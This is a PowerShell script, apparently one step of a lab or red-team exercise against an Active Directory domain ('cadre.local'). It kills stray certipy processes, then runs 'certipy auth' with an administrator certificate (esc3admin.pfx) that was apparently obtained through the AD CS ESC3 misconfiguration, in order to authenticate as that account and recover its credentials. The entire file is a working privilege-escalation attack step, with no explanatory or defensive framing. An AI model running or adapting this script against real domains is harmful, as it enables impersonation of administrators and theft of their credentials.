# T051 ESC3 step 3: certipy auth with esc3admin.pfx (UnPAC confirm)
$ErrorActionPreference = "Continue"
$certpy = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\certipy.exe"
Set-Location C:\Tools\cadre-attack
# hygiene: kill any orphaned certipy first
Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*certipy*" } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
$pfx = "C:\Tools\cadre-attack\esc3admin.pfx"
Write-Output "pfx_exists=$(Test-Path $pfx)"
if (Test-Path $pfx) {
  & $certpy auth -pfx $pfx -dc-ip 192.168.77.10 -domain cadre.local -debug 2>&1 | Select-Object -Last 10
  Write-Output "auth_rc=$LASTEXITCODE"
} else { Write-Output "NO_PFX" }
Write-Output "=== ESC3_AUTH_DONE ==="
